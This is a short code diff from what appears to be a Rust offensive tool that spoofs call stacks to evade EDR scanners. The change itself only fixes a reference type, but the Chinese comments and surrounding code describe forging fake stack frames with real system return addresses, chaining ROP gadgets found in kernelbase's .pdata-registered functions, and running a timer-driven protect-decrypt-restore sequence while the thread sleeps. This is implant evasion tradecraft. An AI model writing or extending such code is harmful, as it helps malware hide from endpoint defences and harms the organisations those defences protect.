@@ -351,7 +351,7 @@ impl StackSpoof {
     ///
     /// 1. 在栈上通过物理写入真实的系统函数返回地址,捏造一个合法连贯的假调用链(RtlUserThreadStart ➔ BaseThreadInitThunk ➔ EnumDateFormatsExA)给edr的扫描器看
     /// 2. 通过计算偏移,利用add rsp和call [rbx]这两个ROP零件,把这些假的栈帧串联起来.当定时器触发时,cpu顺着这条链安全的执行“修改保护属性 ➔ 解密 ➔ 还原环境”的全部动作.在hypnus.rs的ctx[5],主线程上下文被强行修改,rip指向WaitForSingleObject时.在WaitForSingleObject休眠阶段,运行时对应ctx[5].此时edr去挂起该线程检查它的堆栈.看到的是ZwWaitForWork → RtlAcquireSRWLock → BaseThreadInitThunk
-    pub fn spoof(&self, ctxs: &mut [CONTEXT], cfg: &&Config, kind: Obfuscation) -> Result<()> {
+    pub fn spoof(&self, ctxs: &mut [CONTEXT], cfg: &Config, kind: Obfuscation) -> Result<()> {
         // 得到kernelbase.dll的运行时函数表(.pdata异常表即image_runtime_function)
         // 因为edr在stack walking时,会去.pdata表中验证每个返回地址是否属于一个合法注册的非叶子函数.我们寻找的gadget必须位于.pdata注册的合法函数体内
         let pe_kernelbase = Unwind::new(PE::parse(cfg.modules.kernelbase.as_ptr()));
@@ -402,7 +402,7 @@ impl StackSpoof {
                 ctx.Rsp = (ctx.Rsp - 0x1000 * 10)
                     - (cfg.stack.rtl_user_thread_size
                         + cfg.stack.base_thread_size
-                        + (**cfg).stack.enum_date_size
+                        + (*cfg).stack.enum_date_size
                         + gadget_size
                         + add_rsp_size
                         + 48) as u64;
